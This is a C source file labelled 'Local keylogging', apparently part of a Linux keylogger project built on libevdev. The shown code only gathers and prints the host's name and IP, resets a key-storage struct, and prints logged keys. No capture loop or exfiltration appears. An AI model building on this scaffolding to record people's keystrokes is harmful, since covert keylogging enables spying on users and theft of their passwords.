/**
 * Local keylogging
 */

#include "keylogger.h"

// for keylogging
#define _POSIX_SOURCE
#include <arpa/inet.h>  // display hostname
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <netdb.h>       // display hostname
#include <netinet/in.h>  // display hostname
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>  // display hostname
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/types.h>  // display hostname
#include <time.h>
#include <unistd.h>

// this is an indicator for when to stop the keylogging loop. 0 = stop
int log_indicator = 1;

// Returns hostname for the local computer
void checkHostName(int hostname) {
  if (hostname == -1) {
    perror("gethostname");
    exit(1);
  }
}

// Returns host information corresponding to host name
void checkHostEntry(struct hostent* hostentry) {
  if (hostentry == NULL) {
    perror("gethostbyname");
    exit(1);
  }
}

// Converts space-delimited IPv4 addresses
// to dotted-decimal format
void checkIPbuffer(char* IPbuffer) {
  if (NULL == IPbuffer) {
    perror("inet_ntoa");
    exit(1);
  }
}

void log_device(key_package* key_package) {
  char hostbuffer[256];
  char* IPbuffer;
  struct hostent* host_entry;
  int hostname;

  // To retrieve hostname
  hostname = gethostname(hostbuffer, sizeof(hostbuffer));
  checkHostName(hostname);

  // To retrieve host information
  host_entry = gethostbyname(hostbuffer);
  checkHostEntry(host_entry);

  // To convert an Internet network
  // address into ASCII string
  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));

  // key_package->host_device_name = hostbuffer;
  // key_package->host_device_IP = IPbuffer;

  printf("Host name: %s\n", hostbuffer);
  printf("Host IP: %s\n", IPbuffer);
}

void reset_structs(key_package* key_package) {
  // key_info blank = {.key = "", .timestamp = ""};
  // key_package->keys = &blank;
  key_package->keys_arr_size = 0;
}

void print_logged_keys(key_package package) {
  printf("All keys in key_package struct: \n");

  for (size_t i = 0; i < package.keys_arr_size; i++) {
    printf("%s  ", package.keys[i].key);
  }
  printf("\n");
}
